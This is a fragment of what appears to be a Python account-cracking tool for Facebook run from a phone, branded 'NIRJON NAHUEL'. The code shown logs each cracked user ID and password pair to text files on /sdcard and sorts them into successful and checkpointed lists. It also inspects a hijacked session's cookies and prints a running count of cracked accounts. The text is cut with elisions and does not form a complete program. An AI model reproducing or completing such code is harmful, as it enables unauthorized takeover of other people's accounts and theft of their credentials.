...
\033[33;1m     NIRJON NAHUEL \033[38;5;46m\033[38;5;46m: {uid} ●\033[38;5;46m\033[38;5;46m: {ps}
""")
                import os
                cek_apk(session,coki)
                import os
                open('/sdcard/NIRJON NAHUEL -OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
...
#______𝑪𝑷-𝑰𝑵-𝑭𝑹𝑶👇👇👇👇 
 ...
 NIRJON NAHUEL \033[38;5;46ml\033[38;5;46m: {uid} ●\033[38;5;46m \033[38;5;46m: {ps}""")
                open('/sdcard/\033[38;5;46NIRJON NAHUEL .txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
#______𝑬𝑴𝑶𝑱𝑰-𝑪𝑹𝑲-𝑺𝒀𝑺𝑻𝑬𝑴👇👇👇👇 
        ...
        sys.stdout.write(f"\r \33[1;90m[{colr}🦋⃟ᎶꫝᴍᴇᏒ✮⃝𝙰𝙺𝙰𝚂𝙷𝄟⃝\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{len(oks)}\33[1;90m]-  "),
        sys.stdout.flush()
        sys.stdout.write(f'\r\r%s {x}[{xr}\033[38;5;46mNIRJON NAHUEL💥{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
xxr()